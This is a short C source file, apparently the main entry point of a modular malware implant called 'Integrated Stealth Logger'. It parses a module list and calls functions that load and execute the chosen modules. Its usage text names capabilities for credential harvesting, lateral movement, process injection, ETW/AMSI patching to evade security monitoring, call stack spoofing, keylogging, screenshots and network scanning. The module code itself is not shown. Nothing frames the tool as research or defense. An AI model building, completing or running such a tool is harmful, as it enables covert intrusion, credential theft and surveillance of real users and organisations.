#include "modular_payload.h"

void print_usage() {
    printf("=== Integrated Stealth Logger ===\n");
    printf("Usage: stealthlogger -p <module1,module2,...>\n");
    printf("\nModule IDs:\n");
    printf("1 - Credential Harvester\n");
    printf("2 - Lateral Movement\n");
    printf("3 - File Transfer\n");
    printf("4 - Process Injection\n");
    printf("5 - System Information\n");
    printf("6 - ETW/AMSI Patcher\n");
    printf("7 - Call Stack Spoofer\n");
    printf("8 - Keylogger\n");
    printf("9 - Screenshot\n");
    printf("10 - Network Scanner\n");
    printf("\nExample: stealthlogger -p 1,3,6\n");
}

int parse_arguments(int argc, char* argv[], int* module_ids, int* module_count) {
    if (argc != 3) {
        return 0;
    }

    if (strcmp(argv[1], "-p") != 0) {
        return 0;
    }

    char* token = strtok(argv[2], ",");
    while (token != NULL && *module_count < MAX_MODULES) {
        int module_id = atoi(token);
        if (module_id >= 1 && module_id <= 10) {
            module_ids[(*module_count)++] = module_id;
        }
        token = strtok(NULL, ",");
    }

    return *module_count > 0;
}

int main(int argc, char* argv[]) {
    int module_ids[MAX_MODULES];
    int module_count = 0;

    if (!parse_arguments(argc, argv, module_ids, &module_count)) {
        print_usage();
        return 1;
    }

    init_modules();
    load_modules(module_count, module_ids);
    execute_modules();
    cleanup_modules();

    printf("\n=== Operation Completed Successfully ===\n");
    return 0;
}